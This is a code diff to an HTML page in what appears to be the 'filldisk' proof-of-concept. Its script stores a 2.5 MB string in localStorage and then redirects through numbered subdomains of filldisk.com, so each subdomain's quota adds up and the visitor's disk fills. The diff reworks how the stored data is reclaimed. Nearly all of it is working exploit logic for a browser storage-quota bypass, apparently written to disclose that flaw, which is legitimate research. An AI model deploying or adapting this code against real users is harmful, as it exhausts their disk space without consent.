@@ -6,8 +6,6 @@
 <body>
 <script>
 
-  window.stop()
-
   /**
    * Returns a new String that contains `count` copies of `string`
    * concatenated together.
@@ -34,19 +32,15 @@
     var frameNum = parseInt(window.location.hostname.match(/^([^.]+)\./i)[1])
 
     /**
-     * If true, reclaim the space we used.
+     * Should we reclaim space instead of stealing it?
+     * If true, we will reclaim the space we used.
      * @type {Boolean}
      */
 
-    var shouldFree = window.location.search.match(/free=(\w+)/i)[1] == 'true'
-
-    /**
-     * The highest subdomain that we need to reclaim space from.
-     * We can stop after we reach this domain.
-     * @type {Number}
-     */
-
-    var highestSubdomain = parseInt(window.location.search.match(/highest=(\d+)/i)[1])
+    var shouldReclaim = window.location.search.match(/reclaim=(\w+)/i)
+    if (shouldReclaim) {
+      shouldReclaim = (shouldReclaim[1] == 'true')
+    }
 
     /**
      * Generate a 2.5 MB string. This st
@@ -66,7 +60,8 @@
      */
 
     try {
-      if (shouldFree) {
+      if (shouldReclaim) {
+        localStorage['filldisk'] = ''
         localStorage.removeItem('filldisk')
       } else {
         localStorage['filldisk'] = n2500kb
@@ -86,8 +81,10 @@
     /**
      * Redirect to the next subdomain!
      */
-    if (!shouldFree || frameNum < highestSubdomain) {
-      window.location = 'http://' + (frameNum + 1) + '.filldisk.com/frame.html?free=' + shouldFree + '&highest=' + highestSubdomain
+    if (shouldReclaim && frameNum > 1) {
+      window.location = 'http://' + (frameNum - 1) + '.filldisk.com/frame.html?reclaim=' + shouldReclaim
+    } else if (!shouldReclaim) {
+      window.location = 'http://' + (frameNum + 1) + '.filldisk.com/frame.html'
     }
 
   })()
